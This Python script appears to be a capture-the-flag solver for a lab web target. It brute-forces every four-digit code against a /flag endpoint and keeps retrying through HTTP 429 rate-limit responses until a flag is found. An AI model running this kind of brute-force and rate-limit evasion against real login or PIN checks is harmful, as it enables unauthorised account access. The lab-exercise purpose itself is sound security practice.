import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

class Solver:
    def __init__(self):
        self.session = get_session()

    def req(self, code: str):
        POST_URL = "https://quoccaair-ff.quoccacorp.com/flag"
        while True:
            response = self.session.post(POST_URL, data={"code": code})
            if response.status_code != 429:
                return response

    def main(self):
        for i in range(10000):
            code = f"{i:04}"
            response = self.req(code)
            if find_flag(response.text): break

if __name__ == "__main__":
    Solver().main()